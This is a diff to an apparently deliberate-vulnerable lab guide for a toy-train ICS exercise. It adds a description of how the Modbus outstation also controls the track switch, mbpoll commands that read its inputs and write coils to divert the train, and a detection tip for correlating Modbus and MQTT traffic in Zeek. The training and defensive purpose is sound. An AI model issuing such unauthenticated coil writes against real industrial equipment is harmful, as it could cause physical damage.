@@ -20,10 +20,15 @@ The target services on the Docker network are:
 
 - `web-mqtt` or `web-modbus` — FastAPI HTTP, port 8000
 - `mosquitto` — MQTT broker, port 1883 (both train MQTT and the switch)
-- `controller` — Modbus outstation, port 5020 (Modbus mode only)
+- `controller` — Modbus outstation, port 5020. Under the event configuration
+  it mediates BOTH the train (HR 0/1/2 + coil 0) AND the track switch
+  (coils 1/2 + DIs 2/3/4). See M10 for the switch surface.
 - `switch-controller-mqtt` — MQTT client that owns the Circuit Cubes
   switch. Not a listening port; discoverable only by seeing it publish
-  to `choochoo/switch/+/state` on the broker.
+  to `choochoo/switch/+/state` on the broker. Under the event
+  configuration the outstation also publishes to the switch's cmd/throw
+  topic when its coils are written, so an attacker on `1883/tcp` will see
+  the outstation appearing as a legitimate switch client.
 
 Deeper "why each attack works" reference: `VULNERABILITIES.md` (host).
 
@@ -108,6 +113,26 @@ async def go():
 asyncio.run(go())
 PY
 ```
+
+**The outstation also mediates the track switch (see M10).** Coils 1 and 2
+are edge-triggered switch throws — a Modbus master doesn't need to speak
+MQTT to divert the train:
+
+```sh
+# Read the switch DIs (position + online flag) — DIs 2/3/4, so `-r 3 -c 3`.
+mbpoll -m tcp -p 5020 -a 1 -t 0 -r 3 -c 3 controller
+
+# Throw the switch to straight (coil address 1, mbpoll `-r 2`).
+mbpoll -m tcp -p 5020 -a 1 -t 0 -r 2 -c 1 controller 1
+
+# Throw the switch to curve (coil address 2, mbpoll `-r 3`).
+mbpoll -m tcp -p 5020 -a 1 -t 0 -r 3 -c 1 controller 1
+```
+
+The outstation is now an MQTT client itself: coil writes translate into
+`ThrowCommand` publishes on the switch broker. A Zeek sensor sniffing
+`mqtt_publish.log` sees the outstation as the source, NOT the attacker —
+correlate Modbus writes on 5020 with MQTT publishes on 1883 by timestamp.
 
 ## 4. The third path: the web API
 
